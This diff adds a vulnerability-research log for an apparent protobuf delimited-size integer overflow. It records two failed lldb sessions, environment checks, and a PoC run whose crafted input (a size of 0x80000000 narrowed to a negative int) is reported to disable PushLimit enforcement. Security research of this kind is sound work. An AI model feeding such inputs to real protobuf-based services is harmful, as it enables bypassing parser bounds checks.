@@ -1,0 +1,56 @@
+Attempt 1: /opt/homebrew/opt/llvm/bin/lldb -b -s bugs/protobuf/delimited-size-int-overflow/debugging/lldb_commands.txt ./bugs/protobuf/delimited-size-int-overflow/debugging/poc_debug
+
+(lldb) target create "./bugs/protobuf/delimited-size-int-overflow/debugging/poc_debug"
+Current executable set to '/Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/bugs/protobuf/delimited-size-int-overflow/debugging/poc_debug' (arm64).
+(lldb) command source -s 0 'bugs/protobuf/delimited-size-int-overflow/debugging/lldb_commands.txt'
+Executing commands in '/Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/bugs/protobuf/delimited-size-int-overflow/debugging/lldb_commands.txt'.
+(lldb) breakpoint set --file poc_real.cpp --line 48
+Breakpoint 1: where = poc_debug`<+1452> [inlined] google::protobuf::io::CodedInputStream::CurrentPosition() const at poc_real.cpp:48:47, address = 0x0000000100002e1c
+(lldb) breakpoint set --file coded_stream.cc --line 125
+Breakpoint 2: 3 locations.
+(lldb) breakpoint set --file coded_stream.cc --line 132
+Breakpoint 3: where = poc_debug`google::protobuf::io::CodedInputStream::PushLimit(int) + 312 at coded_stream.cc:132:3, address = 0x0000000100006f40
+(lldb) breakpoint set --file poc_real.cpp --line 51
+Breakpoint 4: where = poc_debug`main + 1512 at poc_real.cpp:51:45, address = 0x0000000100002e58
+(lldb) breakpoint set --file poc_real.cpp --line 54
+Breakpoint 5: where = poc_debug`<+1976> [inlined] google::protobuf::io::CodedInputStream::CurrentPosition() const at poc_real.cpp:54:42, address = 0x0000000100003028
+(lldb) run
+error: could not find 'debugserver'. Please ensure it is properly installed and available in your PATH
+
+Attempt 2: /opt/homebrew/opt/llvm/bin/lldb --arch arm64 -b -s bugs/protobuf/delimited-size-int-overflow/debugging/lldb_commands.txt ./bugs/protobuf/delimited-size-int-overflow/debugging/poc_debug
+
+(lldb) target create --arch=arm64 "./bugs/protobuf/delimited-size-int-overflow/debugging/poc_debug"
+Current executable set to '/Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/bugs/protobuf/delimited-size-int-overflow/debugging/poc_debug' (arm64).
+(lldb) command source -s 0 'bugs/protobuf/delimited-size-int-overflow/debugging/lldb_commands.txt'
+Executing commands in '/Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/bugs/protobuf/delimited-size-int-overflow/debugging/lldb_commands.txt'.
+(lldb) breakpoint set --file poc_real.cpp --line 48
+Breakpoint 1: where = poc_debug`<+1452> [inlined] google::protobuf::io::CodedInputStream::CurrentPosition() const at poc_real.cpp:48:47, address = 0x0000000100002e1c
+(lldb) breakpoint set --file coded_stream.cc --line 125
+Breakpoint 2: 3 locations.
+(lldb) breakpoint set --file coded_stream.cc --line 132
+Breakpoint 3: where = poc_debug`google::protobuf::io::CodedInputStream::PushLimit(int) + 312 at coded_stream.cc:132:3, address = 0x0000000100006f40
+(lldb) breakpoint set --file poc_real.cpp --line 51
+Breakpoint 4: where = poc_debug`main + 1512 at poc_real.cpp:51:45, address = 0x0000000100002e58
+(lldb) breakpoint set --file poc_real.cpp --line 54
+Breakpoint 5: where = poc_debug`<+1976> [inlined] google::protobuf::io::CodedInputStream::CurrentPosition() const at poc_real.cpp:54:42, address = 0x0000000100003028
+(lldb) run
+error: could not find 'debugserver'. Please ensure it is properly installed and available in your PATH
+
+Environment checks:
+- codesign -s - -f succeeded (ad-hoc signature present on poc_debug)
+- DevToolsSecurity -status failed: "Failed to get right definition for: system.privilege.taskport.debug"
+- gdb not installed
+
+Fallback execution: ./bugs/protobuf/delimited-size-int-overflow/debugging/poc_debug
+
+input_hex=80 80 80 80 08 de ad be ef 41 42 43 44
+size_u32=2147483648
+size_hex=0x80000000
+narrowed_size_i32=-2147483648
+int_max=2147483647
+position_after_size=5
+bytes_remaining=8
+bytes_until_limit_after_push=-1
+skip_remaining_succeeded=true
+final_position=13
+evidence=overflowed size disables PushLimit enforcement in the real library
